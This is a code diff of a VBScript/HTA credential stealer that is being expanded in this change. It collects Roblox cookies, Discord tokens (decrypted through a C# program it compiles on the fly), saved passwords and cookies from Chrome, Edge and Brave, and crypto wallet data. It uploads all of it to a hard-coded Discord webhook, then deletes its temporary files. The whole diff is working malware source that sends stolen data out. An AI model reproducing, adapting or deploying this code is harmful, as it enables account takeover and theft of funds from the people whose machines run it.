@@ -15,34 +15,94 @@ WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ7
 
 appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
 localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
+temp = sh.ExpandEnvironmentStrings("%TEMP%")
 
-' Send an initial hit so you know it ran
-Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)
-
-' 1. Grab Roblox cookies
-Dim rPath, rContent
-rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
-If fso.FileExists(rPath) Then
-    rContent = ReadFile(rPath)
-    If Len(rContent) > 0 Then Call PostFile("robloxcookies.dat", rContent)
-End If
+' 1. System Info
+Dim sysinfo
+sysinfo = "**PC:** " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
+          "**User:** " & sh.ExpandEnvironmentStrings("%USERNAME%")
+Call PostEmbed(":desktop: System Info", sysinfo, 3447003)
 
 ' 2. Grab and Decrypt Discord Tokens via C# Compiler
-Call DecryptDiscord
+Call RunCSharp
+
+' 3. Grab Roblox Cookies (Parsed into Text)
+Call GrabRoblox
+
+' 4. Grab Crypto Wallets (Zips them up)
+Call GrabWallets
 
 window.close()
 
-Sub DecryptDiscord()
-    Dim dPath, dFolder, file, rawText
-    dPath = appdata & "\discord\Local Storage\leveldb"
-    If Not fso.FolderExists(dPath) Then Exit Sub
+Sub GrabRoblox()
+    Dim rPath, raw
+    rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
     
-    ' We write a C# program to temp, compile it, and run it
-    Dim csFile, exeFile, code
-    csFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\d.cs"
-    exeFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\d.exe"
+    If fso.FileExists(rPath) Then
+        ' Read as text to find the plaintext cookie
+        raw = ReadFileText(rPath)
+        
+        If InStr(raw, "_|WARNING") > 0 Then
+            ' Extract from _|WARNING to the end of the line/string
+            Dim startPos : startPos = InStr(raw, "_|WARNING")
+            Dim cookie : cookie = Mid(raw, startPos)
+            ' Clean up any trailing JSON garbage
+            Dim endPos : endPos = InStr(cookie, """")
+            If endPos > 0 Then cookie = Left(cookie, endPos - 1)
+            
+            Call PostEmbed(":cookie: Roblox Cookie", cookie, 65280)
+        Else
+            ' If it's encrypted or unreadable, send the file instead
+            Call PostFile("robloxcookies.dat", ReadFileBinary(rPath))
+        End If
+    End If
+End Sub
+
+Sub GrabWallets()
+    Dim staging : staging = temp & "\w_stage"
+    Dim zipPath : zipPath = temp & "\w.zip"
     
-    code = "using System; using System.IO; using System.Text; using System.Text.RegularExpressions; using System.Security.Cryptography; using System.Runtime.InteropServices; " & _
+    On Error Resume Next
+    fso.DeleteFolder staging, True
+    fso.DeleteFile zipPath, True
+    fso.CreateFolder staging
+    On Error GoTo 0
+    
+    Dim paths(4)
+    paths(0) = appdata & "\Exodus\exodus.wallet"
+    paths(1) = appdata & "\Electrum\wallets"
+    paths(2) = appdata & "\atomic\Local Storage\leveldb"
+    paths(3) = localappdata & "\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"
+    paths(4) = localappdata & "\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa"
+    
+    Dim i, dest
+    For i = 0 To 4
+        If fso.FolderExists(paths(i)) Then
+            dest = staging & "\" & i
+            fso.CreateFolder dest
+            sh.Run "cmd.exe /c xcopy """ & paths(i) & "\*.*"" """ & dest & "\"" /E /I /Y /Q", 0, True
+        End If
+    Next
+    
+    sh.Run "cmd.exe /c tar -a -c -f """ & zipPath & """ -C """ & staging & """ .", 0, True
+    
+    If fso.FileExists(zipPath) Then
+        Dim zipContent : zipContent = ReadFileBinary(zipPath)
+        If Len(zipContent) > 0 Then Call PostFile("CryptoWallets.zip", zipContent)
+        fso.DeleteFile zipPath, True
+    End If
+    
+    On Error Resume Next
+    fso.DeleteFolder staging, True
+    On Error GoTo 0
+End Sub
+
+Sub RunCSharp()
+    Dim dPath, csFile, exeFile, code
+    csFile = temp & "\d.cs"
+    exeFile = temp & "\d.exe"
+    
+    code = "using System; using System.IO; using System.Text; using System.Text.RegularExpressions; using System.Security.Cryptography; using System.Runtime.InteropServices; using System.Net; " & _
     "class P { " & _
     "  [DllImport(""crypt32.dll"", SetLastError=true)] static extern bool CryptUnprotectData(byte[] pDataIn, IntPtr ppszDataDescr, byte[] pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut); " & _
     "  [StructLayout(LayoutKind.Sequential)] struct DATA_BLOB { public int cbData; public IntPtr pbData; } " & _
@@ -50,6 +110,7 @@ Sub DecryptDiscord()
     "  static void Main(string[] args) { " & _
     "    try { " & _
     "      string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); " & _
+    "      string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); " & _
     "      string lsPath = Path.Combine(appdata, @""discord\Local State""); " & _
     "      if (!File.Exists(lsPath)) return; " & _
     "      string ls = File.ReadAllText(lsPath); " & _
@@ -73,50 +134,84 @@ Sub DecryptDiscord()
     "            using (AesGcm aes = new AesGcm(masterKey)) { " & _
     "              byte[] pt = new byte[ct.Length]; aes.Decrypt(nonce, ct, tag, pt); " & _
     "              string token = Encoding.UTF8.GetString(pt).TrimEnd('\0'); " & _
-    "              if (token.Length > 40) Console.WriteLine(token); " & _
+    "              if (token.Length > 40) Console.WriteLine(""TOKEN|"" + token); " & _
     "            } " & _
     "          } catch {} " & _
     "        } " & _
+    "      } " & _
+    "      string[] brs = { ""Google\\Chrome"", ""Microsoft\\Edge"", ""BraveSoftware\\Brave-Browser"" }; " & _
+    "      foreach (string br in brs) { " & _
+    "        string ld = Path.Combine(local, br, @""User Data\Default\Login Data""); " & _
+    "        string ck = Path.Combine(local, br, @""User Data\Default\Network\Cookies""); " & _
+    "        if (File.Exists(ld)) { try { File.Copy(ld, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), br.Replace(""\\"", ""_"") + ""_Passwords.db"")); Console.WriteLine(""PASS|"" + br); } catch {} } " & _
+    "        if (File.Exists(ck)) { try { File.Copy(ck, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), br.Replace(""\\"", ""_"") + ""_Cookies.db"")); Console.WriteLine(""COOK|"" + br); } catch {} } " & _
     "      } " & _
     "    } catch {} " & _
     "  } " & _
     "}"
 
-    ' Write C# to file
     Dim f: Set f = fso.CreateTextFile(csFile, True)
     f.Write code
     f.Close
 
-    ' Compile using csc.exe (built into Windows .NET)
     Dim csc : csc = sh.ExpandEnvironmentStrings("%WINDIR%") & "\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
     sh.Run "cmd /c """ & csc & """ /target:exe /out:""" & exeFile & """ """ & csFile & """ > nul 2>&1", 0, True
 
-    ' Run the compiler output
     If fso.FileExists(exeFile) Then
         Dim exec: Set exec = sh.Exec("""" & exeFile & """")
         Dim output : output = exec.StdOut.ReadAll
         If Len(output) > 10 Then
             Dim lines : lines = Split(output, vbCrLf)
-            Dim l
+            Dim l, tok
             For Each l In lines
-                If Len(l) > 40 Then
-                    Call PostEmbed(":gift: Discord Token", "**Token:** " & l & vbCrLf & "**PC:** " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 5793266)
+                If Left(l, 6) = "TOKEN|" Then
+                    tok = Mid(l, 7)
+                    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+                    xh.SetOption 2, 13056
+                    xh.Open "GET", "https://discord.com/api/v9/users/@me", False
+                    xh.SetRequestHeader "Authorization", tok
+                    xh.Send
+                    
+                    If xh.Status = 200 Then
+                        Dim info : info = "**Token:** " & tok & vbCrLf & "**Profile:** " & xh.responseText
+                        Call PostEmbed(":gift: Discord Token", info, 5793266)
+                    Else
+                        Call PostEmbed(":gift: Discord (Invalid)", "**Token:** " & tok, 16711680)
+                    End If
+                ElseIf Left(l, 5) = "PASS|" Then
+                    Call PostFile("Browser_Passwords_" & Mid(l, 6) & ".db", ReadFileBinary(sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\" & Replace(Mid(l, 6), "\", "_") & "_Passwords.db"))
+                ElseIf Left(l, 5) = "COOK|" Then
+                    Call PostFile("Browser_Cookies_" & Mid(l, 6) & ".db", ReadFileBinary(sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\" & Replace(Mid(l, 6), "\", "_") & "_Cookies.db"))
                 End If
             Next
         End If
     End If
 
-    ' Cleanup
     On Error Resume Next
     fso.DeleteFile csFile, True
     fso.DeleteFile exeFile, True
+    fso.DeleteFile sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\*_Passwords.db", True
+    fso.DeleteFile sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\*_Cookies.db", True
+    On Error GoTo 0
 End Sub
 
-Function ReadFile(path)
-    ReadFile = ""
+Function ReadFileText(path)
+    ReadFileText = ""
     Dim f: Set f = fso.OpenTextFile(path, 1)
-    ReadFile = f.ReadAll
+    ReadFileText = f.ReadAll
     f.Close
+End Function
+
+Function ReadFileBinary(path)
+    ReadFileBinary = ""
+    Dim stream : Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    On Error Resume Next
+    stream.LoadFromFile path
+    If Err.Number = 0 Then ReadFileBinary = stream.Read
+    stream.Close
+    On Error GoTo 0
 End Function
 
 Sub PostEmbed(t, d, c)
@@ -130,6 +225,7 @@ Sub PostEmbed(t, d, c)
 End Sub
 
 Sub PostFile(fn, ct)
+    If Len(ct) = 0 Then Exit Sub
     Dim DQ: DQ = Chr(34)
     Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
     Dim crlf: crlf = vbCrLf
